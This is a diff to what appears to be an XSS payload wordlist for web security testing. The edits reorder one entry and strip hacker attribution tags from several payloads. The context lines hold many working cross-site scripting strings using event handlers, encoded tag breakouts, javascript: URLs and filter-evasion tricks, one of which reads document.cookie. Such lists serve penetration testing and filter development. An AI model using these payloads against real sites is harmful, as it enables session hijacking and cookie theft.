@@ -1,7 +1,7 @@
+<input oninput=alert(1) value=xss>
 <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
 <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
 <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
-<input oninput=alert(1) value=xss>
 <form><input oninvalid=alert(1) required><input type=submit>
 <a onbeforecopy="alert(1)" contenteditable>test</a>
 <a onbeforecut="alert(1)" contenteditable>test</a>
@@ -136,7 +136,7 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 %22%3E%3Cform%20action=%22javascript:alert(%27XSS9%27)%22%3E%3Cinput%20name=%22x%22%20value=%22x%22/%3E%3C/form%3E
 %22%3E%3Cscript%3Edocument.write(%27%3Cimg%20src=x%20onerror=alert(%27XSS10%27)/%3E%27)%3C/script%3E
 %22%3E%3Csvg%20onload=%22document.write(%27%3Cscript%3Ealert(11)%3C/script%3E')%22/%3E
-%22%3E%3Cimg%20src=x%20onerror=%22document.write(%27%3Cscript%3Ealert(12)%3C/script%3E')%22/%3E
+%22%3E%3Cimg%20src=x%20onerror=%22document.write(%27%3Cscript%3Ealert(XSS)%3C/script%3E')%22/%3E
 %22%3E%3Cbody%20onload=%22document.write(%27%3Cscript%3Ealert(13)%3C/script%3E')%22/%3E
 %22%3E%3Ciframe%20src=%22javascript:document.write(%27%3Cscript%3Ealert(14)%3C/script%3E')%22%3E%3C/iframe%3E
 %22%3E%3Cobject%20data=%22javascript:document.write(%27%3Cscript%3Ealert(15)%3C/script%3E')%22%3E%3C/object%3E
@@ -194,11 +194,11 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 %22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:document.write(%27%3Csvg%20onload=alert(68)%3E%3C/svg%3E')%22/%3E
 ddd");<​/script><​script>alert("XSS");<​/script><​script>aaa("
 6'%22()%26%25%22%3E%3Csvg/onload​=prompt(document.domain)%3E/
-%27"></a><​/script></title></form></span><​/meta><​/style></iframe></noscript></textarea></xmp></pre><​ScRiPt>alert(/hacked%20By%20Ahmad/)<​/sCrIpT>
+%27"></a><​/script></title></form></span><​/meta><​/style></iframe></noscript></textarea></xmp></pre><​ScRiPt>alert(/XSS/)<​/sCrIpT>
 javascript​:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle​="+a+b+c+" popover id=x>Hvita</hvita>")
 <svg%20onx=()%20onload=(confirm)(document.domain)>
 <%2FsCrIpT><​ScRiPt>alert(document.cookie)<%2FsCrIpT>
-%2522%253e%253cscript%253ealert%2528%2527BUG XSS By Wildan!%2527%2529%253c%252fscript%253
+%2522%253e%253cscript%253ealert%2528%2527BUG XSS!%2527%2529%253c%252fscript%253
 "><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
 sm"*alert(1)*"
 "*alert(1)*"
